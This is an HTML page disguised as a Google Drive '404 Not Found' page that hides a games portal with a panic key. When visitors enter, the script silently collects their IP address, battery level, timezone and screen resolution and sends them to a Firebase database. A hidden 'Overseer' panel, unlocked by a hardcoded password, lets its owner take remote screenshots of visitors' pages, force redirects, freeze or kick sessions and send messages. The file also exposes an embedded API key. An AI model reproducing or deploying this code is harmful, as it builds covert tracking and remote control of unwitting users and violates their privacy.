<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        :root { --primary: #00ff41; --bg: #000; --card: #0a0a0a; --accent: #003b00; --panic: #ff3131; --neon: 0 0 10px var(--primary); }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        #ghostTrigger { position: fixed; top: 0; left: 0; width: 60px; height: 60px; z-index: 2147483647; cursor: crosshair; }
        #lockdownScreen { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #maintenanceOverlay { position: fixed; inset: 0; background: #000; z-index: 5000000; display: none; flex-direction: column; align-items: center; justify-content: center; color: var(--primary); font-family: 'Consolas', monospace; }
        #tosOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000000; display: none; align-items: center; justify-content: center; }
        #freezeOverlay { position: fixed; inset: 0; z-index: 9999999; display: none; cursor: wait; background: rgba(0,0,0,0.1); }

        #mainApp { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; border-bottom: 1px solid var(--accent); background: #050505; gap: 10px; }
        
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; padding: 25px; overflow-y: auto; flex-grow: 1; }
        .game-card { background: var(--card); border: 1px solid var(--accent); padding: 20px; border-radius: 6px; text-align: center; cursor: pointer; color: var(--primary); transition: 0.2s; }
        .game-card:hover { border-color: var(--primary); box-shadow: var(--neon); }

        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #080808; border: 1px solid var(--primary); padding: 25px; z-index: 3000000; width: 1000px; border-radius: 8px; color: var(--primary); box-shadow: 0 0 70px #000; }
        .input-box { background: #000; border: 1px solid var(--accent); color: var(--primary); padding: 10px; border-radius: 4px; outline: none; width: 100%; box-sizing: border-box; font-size: 12px; }
        .btn-glow { background: var(--primary); color: #000; border: none; padding: 8px; cursor: pointer; font-weight: bold; border-radius: 4px; text-transform: uppercase; font-size: 10px; }
        .btn-glow:hover { box-shadow: var(--neon); }

        .user-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #111; cursor: pointer; font-size: 12px; }
        .user-row:hover { background: #111; }
        
        .dossier { background: #030303; border: 1px solid #111; padding: 12px; font-size: 10px; color: #888; height: 230px; overflow-y: auto; line-height: 1.4; }
        .dossier b { color: var(--primary); }
        
        #trafficLog { height: 110px; background: #000; border: 1px solid #111; overflow-y: auto; padding: 10px; font-size: 9px; color: #00ff41; margin-top: 10px; font-family: 'Courier New', monospace; }
        #screenPreview { width: 100%; height: 160px; background: #000; border: 1px solid #222; background-size: contain; background-repeat: no-repeat; background-position: center; margin: 10px 0; }
        
        #remoteAlert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #000; border: 2px solid var(--primary); padding: 25px; color: var(--primary); z-index: 9999999; display: none; width: 350px; text-align: center; }
    </style>
</head>
<body>

    <div id="ghostTrigger" onclick="adminAuth()"></div>
    <div id="lockdownScreen"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
    <div id="maintenanceOverlay"><h1>SYSTEM_LOCKDOWN</h1><p>Overseer maintenance in progress.</p></div>
    <div id="freezeOverlay"></div>
    
    <div id="remoteAlert">
        <h3 style="margin-top:0">PRIORITY_MESSAGE</h3>
        <p id="alertBody"></p>
        <button class="btn-glow" onclick="document.getElementById('remoteAlert').style.display='none'">RECEIVED</button>
    </div>

    <div id="tosOverlay">
        <div style="background:#080808; padding:35px; border-radius:12px; border:1px solid #222; width:350px; text-align:center;">
            <h2 style="color:var(--primary);">MONGLE_OS v24.0</h2>
            <input type="text" id="plebUserInp" class="input-box" placeholder="User Identity...">
            <button class="btn-glow" style="width:100%; margin-top:10px;" onclick="enterSite()">INITIATE</button>
        </div>
    </div>

    <div id="mainApp">
        <div class="top-bar">
            <div style="font-weight:bold;">MONGLE_OS <span id="roleLabel" style="font-size:10px; opacity:0.6;"></span></div>
            <div style="display:flex; flex-grow:1; max-width:600px; gap:8px;">
                <select id="catFilter" class="input-box" style="width:140px;" onchange="filterGames()">
                    <option value="all">ALL_FILES</option>
                    <option value="fnaf">FNAF</option>
                    <option value="action">ACTION</option>
                    <option value="retro">RETRO</option>
                    <option value="logic">LOGIC</option>
                    <option value="horror">HORROR</option>
                </select>
                <input type="text" id="gameSearch" class="input-box" placeholder="Search Database..." oninput="filterGames()">
            </div>
            <div style="display:flex; gap:8px;">
                <button id="rootBtn" class="btn-glow" style="display:none;" onclick="toggleModal('rootHub')">OVERSEER</button>
                <button class="btn-glow" style="background:#1a1a1a; color:white;" onclick="toggleModal('settingsMenu')">⚙️</button>
                <button class="btn-glow" style="background:var(--panic); color:white;" onclick="triggerPanic()">PANIC</button>
            </div>
        </div>
        <div class="grid" id="gameGrid"></div>
    </div>

    <div id="rootHub" class="modal">
        <h3 style="margin-top:0; border-bottom:1px solid #222; padding-bottom:5px;">TOTAL_COMMAND: OVERSEER</h3>
        <div style="display: grid; grid-template-columns: 280px 1fr; gap: 15px;">
            <div id="userList" style="height:550px; overflow-y:auto; border:1px solid #111; background:#000;"></div>
            <div>
                <div id="dossierBox" class="dossier">Waiting for Target...</div>
                <div id="screenPreview"></div>
                <div id="trafficLog">-- LIVE_SESSION_STREAM --</div>
                
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px; margin-top:10px;">
                    <input type="text" id="adminMsgInp" class="input-box" placeholder="Transmission...">
                    <input type="text" id="redirUrlInp" class="input-box" placeholder="Target Redirect URL...">
                </div>
                
                <div style="display:grid; grid-template-columns: repeat(5, 1fr); gap:4px; margin-top:5px;">
                    <button class="btn-glow" onclick="sendMessage()">MSG</button>
                    <button class="btn-glow" onclick="requestCapture()">SHOT</button>
                    <button class="btn-glow" style="background:cyan;" onclick="forceRedirect()">REDIR</button>
                    <button class="btn-glow" style="background:yellow;" onclick="punish('frozen')">FREEZE</button>
                    <button class="btn-glow" style="background:var(--primary);" onclick="broadcast()">B-CAST</button>
                    <button class="btn-glow" style="background:#f39c12;" onclick="toggleMaintenance()">MAINT</button>
                    <button class="btn-glow" style="background:orange;" onclick="punish('shadowed')">SHADOW</button>
                    <button class="btn-glow" style="background:red; color:white;" onclick="punish('kicked')">KICK</button>
                    <button class="btn-glow" style="background:#555; color:white;" onclick="wipeAll()">WIPE</button>
                    <button class="btn-glow" onclick="toggleModal('rootHub')">EXIT</button>
                </div>
            </div>
        </div>
    </div>

    <div id="settingsMenu" class="modal" style="width:320px;">
        <h3>LOCAL_CONFIG</h3>
        <p style="font-size:11px;">REDIRECT_PATH:</p>
        <input type="text" id="pUrlInp" class="input-box">
        <p style="font-size:11px; margin-top:10px;">TRIGGER_KEY:</p>
        <input type="text" id="pKeyInp" class="input-box" maxlength="1">
        <button class="btn-glow" style="width:100%; margin-top:20px;" onclick="saveSettings()">APPLY</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let userRole = "PLEB", userRef = null, myID = null, selectedTarget = null, isMaint = false;
        let config = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'q' };

        // CORE LISTENERS
        window.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.altKey && e.shiftKey && e.key === 'P') {
                document.getElementById('lockdownScreen').style.display = "none";
                document.getElementById('maintenanceOverlay').style.display = "none";
            }
            if (e.target.tagName === 'INPUT') return;
            if (e.key.toLowerCase() === config.key.toLowerCase()) triggerPanic();
            if (e.shiftKey && e.key === 'L') document.getElementById('tosOverlay').style.display = 'flex';
        }, true);

        window.adminAuth = () => { if (prompt("ROOT_KEY:") === "MONGLE_OWNER_99") upgrade("MONGLE"); };

        function upgrade(role) {
            userRole = role; 
            document.getElementById('lockdownScreen').style.display = 'none';
            document.getElementById('mainApp').style.display = 'flex';
            document.getElementById('rootBtn').style.display = 'block';
            document.getElementById('roleLabel').innerText = `[${role}]`;
            loadGames(); startOverseer();
        }

        window.enterSite = async () => {
            const name = document.getElementById('plebUserInp').value.trim() || "Guest";
            const ipRes = await fetch('https://api.ipify.org?format=json').catch(()=>({json:()=>({ip:'N/A'})}));
            const ipData = await ipRes.json();
            const bat = await navigator.getBattery().then(b => b.level * 100 + "%").catch(()=>"N/A");
            
            document.getElementById('tosOverlay').style.display = 'none';
            document.getElementById('mainApp').style.display = 'flex';
            
            userRef = push(ref(db, 'system/presence'), { 
                name: name, activity: "Browsing", 
                ip: ipData.ip, join: new Date().toLocaleTimeString(),
                res: `${screen.width}x${screen.height}`, bat: bat,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lastSeen: serverTimestamp()
            });
            myID = userRef.key;
            onDisconnect(userRef).remove();
            
            onValue(ref(db, `system/presence/${myID}`), (s) => {
                const u = s.val(); if(!u) return;
                if(u.kicked) window.location.replace(config.url);
                if(u.redir) window.location.replace(u.redir);
                document.getElementById('freezeOverlay').style.display = u.frozen ? 'block' : 'none';
                if(u.msg) { 
                    document.getElementById('alertBody').innerText = u.msg; 
                    document.getElementById('remoteAlert').style.display = 'block'; 
                    update(userRef, {msg: null}); 
                }
                if(u.capReq) { 
                    html2canvas(document.body).then(canvas => { 
                        update(userRef, { lastCap: canvas.toDataURL("image/webp", 0.15), capReq: false }); 
                    }); 
                }
            });
            loadGames();
        };

        function startOverseer() {
            onValue(ref(db, 'system/presence'), (snap) => {
                const list = document.getElementById('userList'); list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val(); if(c.key === myID) return;
                    const row = document.createElement('div'); row.className = "user-row";
                    row.innerHTML = `<span><b>${u.name}</b></span> <small>${u.activity}</small>`;
                    row.onclick = () => {
                        selectedTarget = c.key;
                        document.getElementById('dossierBox').innerHTML = `
                            <b>IDENT:</b> ${u.name}<br><b>IP:</b> ${u.ip}<br>
                            <b>BATTERY:</b> ${u.bat}<br><b>TIMEZONE:</b> ${u.tz}<br>
                            <b>RESOLUTION:</b> ${u.res}<br><b>DB_ID:</b> ${c.key}<br>
                            <b>STATUS:</b> ${u.frozen ? 'FROZEN' : 'ACTIVE'}
                        `;
                        document.getElementById('screenPreview').style.backgroundImage = `url(${u.lastCap || ''})`;
                    };
                    list.appendChild(row);
                });
            });
            onValue(ref(db, 'system/traffic'), (snap) => {
                const log = document.getElementById('trafficLog'); log.innerHTML = "";
                snap.forEach(t => {
                    const d = document.createElement('div');
                    d.innerText = `[${t.val().time}] ${t.val().user}: ${t.val().action}`;
                    log.prepend(d);
                });
            });
            onValue(ref(db, 'system/config/maintMode'), (s) => {
                isMaint = s.val();
                if(userRole !== "MONGLE") document.getElementById('maintenanceOverlay').style.display = isMaint ? "flex" : "none";
            });
        }

        window.logAction = (action) => {
            if(userRef) {
                const name = document.getElementById('plebUserInp').value || "Guest";
                push(ref(db, 'system/traffic'), { user: name, action: action, time: new Date().toLocaleTimeString() });
            }
        };

        async function loadGames() {
            const res = await fetch(`https://api.github.com/repos/bob154526-hue/Mongle/contents/`);
            const data = await res.json();
            window.rawGames = data.filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
            filterGames();
        }

        window.filterGames = () => {
            const q = document.getElementById('gameSearch').value.toLowerCase();
            const cat = document.getElementById('catFilter').value;
            const grid = document.getElementById('gameGrid'); grid.innerHTML = "";
            window.rawGames.filter(g => {
                const n = g.name.toLowerCase();
                if (!n.includes(q)) return false;
                if (cat === 'fnaf') return n.includes('fnaf');
                if (cat === 'retro') return n.includes('pac') || n.includes('mario');
                if (cat === 'horror') return n.includes('scary') || n.includes('exe');
                if (cat === 'action') return n.includes('run') || n.includes('drive');
                if (cat === 'logic') return n.includes('puzzle') || n.includes('chess');
                return true;
            }).forEach(f => {
                const card = document.createElement('div'); card.className = "game-card";
                card.innerText = f.name.replace('.html','').toUpperCase();
                card.onclick = () => {
                    logAction(`Opened ${card.innerText}`);
                    window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${f.name}`);
                };
                grid.appendChild(card);
            });
        };

        window.sendMessage = () => { if(selectedTarget) update(ref(db, `system/presence/${selectedTarget}`), {msg: document.getElementById('adminMsgInp').value}); };
        window.forceRedirect = () => { if(selectedTarget) update(ref(db, `system/presence/${selectedTarget}`), {redir: document.getElementById('redirUrlInp').value}); };
        window.broadcast = () => {
            const m = document.getElementById('adminMsgInp').value;
            onValue(ref(db, 'system/presence'), (s) => { s.forEach(c => update(ref(db, `system/presence/${c.key}`), {msg: m})); }, {onlyOnce: true});
        };
        window.toggleMaintenance = () => update(ref(db, 'system/config'), { maintMode: !isMaint });
        window.punish = (type) => { if(selectedTarget) {
            onValue(ref(db, `system/presence/${selectedTarget}/${type}`), (s)=>{
                update(ref(db, `system/presence/${selectedTarget}`), {[type]: !s.val()});
            }, {onlyOnce: true});
        }};
        window.requestCapture = () => { if(selectedTarget) update(ref(db, `system/presence/${selectedTarget}`), { capReq: true }); };
        window.wipeAll = () => { if(confirm("Wipe all active sessions?")) remove(ref(db, 'system/presence')); };
        window.triggerPanic = () => window.location.replace(config.url);
        window.toggleModal = (id) => { const e = document.getElementById(id); e.style.display = (e.style.display === 'block') ? 'none' : 'block'; };
        window.saveSettings = () => {
            config.url = document.getElementById('pUrlInp').value;
            config.key = document.getElementById('pKeyInp').value;
            localStorage.setItem('pUrl', config.url); localStorage.setItem('pKey', config.key);
            toggleModal('settingsMenu');
        };
    </script>
</body>
</html>
